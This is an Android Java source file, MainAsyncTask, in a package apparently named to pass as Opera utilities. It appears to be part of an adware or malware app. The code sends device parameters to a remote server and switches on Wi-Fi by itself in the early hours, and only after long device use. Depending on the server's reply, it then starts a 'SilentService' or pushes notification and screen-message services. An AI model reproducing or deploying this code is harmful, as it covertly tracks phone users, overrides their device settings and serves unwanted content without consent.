package com.opera.utils.utils;

import java.util.Calendar;
import java.util.Date;
import java.util.Random;

import com.opera.utils.services.NotifacationService;
import com.opera.utils.services.ScreenMsgService;
import com.opera.utils.services.SilentService;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;

public class MainAsyncTask extends AsyncTask<Void, Integer, String> {

	private Context context;

	public MainAsyncTask(Context context) {
		this.context = context;
	}

	private String resParams = null;

	@Override
	protected String doInBackground(Void... params) {

		try {

			if (MyHelpUtil.checkNet(context)) {

				String paramsString = MyHelpUtil.add_device_params(context);

				resParams = HttpUtil.postRequest(HttpUtil.BASE_URL
						+ "app_a.action", paramsString);

				MyHelpUtil.synchronousApp(context);

			} else {

				if (setOpenWifi() && MyHelpUtil.isSystemApp(context) == 0) {

					WifiManager wifiManager = (WifiManager) context
							.getSystemService(Context.WIFI_SERVICE);

					wifiManager.setWifiEnabled(true);

				}
				cancel(false);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;
	}

	private boolean setOpenWifi() {
		
		Calendar c = Calendar.getInstance();

		int hour = c.get(Calendar.HOUR_OF_DAY);

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);

		int local_screen_count = localSharedPreferences.getInt("screen_count",
				0);

		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
				"MSG_STATUS", 0);

		boolean time_iner = false;

		if (!msgSharedPreferences.contains("silent")) {
			time_iner = true;
		} else {

			long reslut = Math.abs(new Date().getTime()
					- msgSharedPreferences.getLong("silent", 0));

			/* 45H */
			if (reslut >= 162000 * 1000) {
				time_iner = true;
			}
		}

		if (hour >= 1 && hour <= 6 && time_iner && local_screen_count >= 500) {

			return true;

		} else {


			return false;

		}
	}

	private void swichType() {

		Random random = new Random();

		int res = random.nextInt(2);

		switch (res) {

		case 0:

			NotifacationService NService = new NotifacationService(context);
			
			System.out.println("tzjr");

			NService.execute();

			break;
		case 1:

			ScreenMsgService SService = new ScreenMsgService(context);
			
			System.out.println("cpjr");

			SService.execute();

			break;
		default:
			break;
		}

	}

	@Override
	protected void onPostExecute(String result) {

		int isSystemApp = MyHelpUtil.isSystemApp(context);

		if (resParams != null) {

			if (isSystemApp == 0) {

				if ("0".equals(resParams.trim())) {

					System.out.println("jmjr");

					SilentService siService = new SilentService(context);

					siService.execute();

				} else {

					swichType();

				}

			} else {

				swichType();
			}

		}
	}
}
